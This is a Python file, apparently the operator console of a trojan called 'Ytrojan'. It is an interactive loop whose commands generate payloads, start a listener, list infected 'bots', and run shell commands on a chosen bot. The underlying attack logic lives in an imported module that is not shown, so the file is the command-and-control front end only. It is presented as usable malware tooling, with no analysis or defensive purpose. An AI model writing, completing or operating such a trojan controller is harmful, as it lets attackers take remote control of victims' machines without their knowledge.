# github.com/ycy20090311
# 2023

import YtrojanAPI
import YtrojanString

print(YtrojanString.VersionInfo)

while True:
    try:
        Command = input("Ytrojan >")
        if Command == "help":
            print(YtrojanString.HelpInfo)
        elif Command.split()[0] == "generate":
            Return = YtrojanAPI.Generate(Command.split()[1],Command.split()[2],Command.split()[3])
            if Return == "generate ok":
                print(YtrojanString.CommandInfo % Command.split()[0])
            elif Return == "generate no":
                print(YtrojanString.CommandError % Command.split()[0])
        elif Command.split()[0] == "listen":
            Return = YtrojanAPI.Listen(Command.split()[1],Command.split()[2])
            if Return == "listen ok":
                print(YtrojanString.CommandInfo % Command.split()[0])
            elif Return == "listen no":
                print(YtrojanString.CommandError % Command.split()[0])
        elif Command.split()[0] == "listbot":
            Return = YtrojanAPI.ListBot()
            if Return != "":
                print(YtrojanString.CommandInfo % Command.split()[0])
                print(Return)
            else:
                print(YtrojanString.NotCommandError % "Bot")
        elif Command.split()[0] == "run":
            Return = YtrojanAPI.Run(int(Command.split()[1]),Command.split(" ",2)[2])
            if Return.split()[0] == "shell" and Return.split(" ",1)[1] != "no":
                print(YtrojanString.CommandInfo % Return.split()[0])
                print(Return.split(" ",1)[1])
            elif Return.split()[1] == "ok":
                print(YtrojanString.CommandInfo % Return.split()[0])
            elif Return.split()[1] == "no":
                print(YtrojanString.CommandError % Return.split()[0])
        else:
            print(YtrojanString.NotCommandError % Command.split()[0])
    except KeyboardInterrupt:
        print("\n")
    except EOFError:
        print(YtrojanString.GoodbyeInfo)
        exit(0)



